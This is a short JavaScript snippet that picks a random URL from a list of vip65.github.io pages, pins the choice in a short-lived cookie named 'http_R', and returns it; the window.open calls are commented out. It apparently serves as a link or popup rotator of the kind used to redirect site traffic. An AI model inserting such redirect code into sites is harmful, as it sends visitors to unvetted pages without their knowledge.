var aa = [
    'https://vip65.github.io/15.html',
    'https://vip65.github.io/14.html', 
    'https://vip65.github.io/13.html', 
    'https://vip65.github.io/12.html', 
    'https://vip65.github.io/11.html',
    'https://vip65.github.io/10.html',
    'https://vip65.github.io/9.html',
    'https://vip65.github.io/8.html',
    'https://vip65.github.io/7.html',
    '',
    '',
    '', 
    '', 
    '', 
    '',
    '',
    '',
    '',
    '',
    '',
    ];
var sj = aa[Math.floor(Math.random()*aa.length)];

function setCookie(name,value){
  var Days = 30;
  var exp = new Date();
  exp.setTime(exp.getTime() + 10*100);
  document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
function getCookie(name){
  var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
  if(arr=document.cookie.match(reg))
    return unescape(arr[2]);
  else
    return null;
}
function sz(){
    if(!getCookie("http_R")){
        setCookie("http_R",sj);
        
        return sj ;
     //   window.open(sj)
    }else{
    var url=getCookie("http_R");
    return url ;
     //   window.open(url)
    }
}
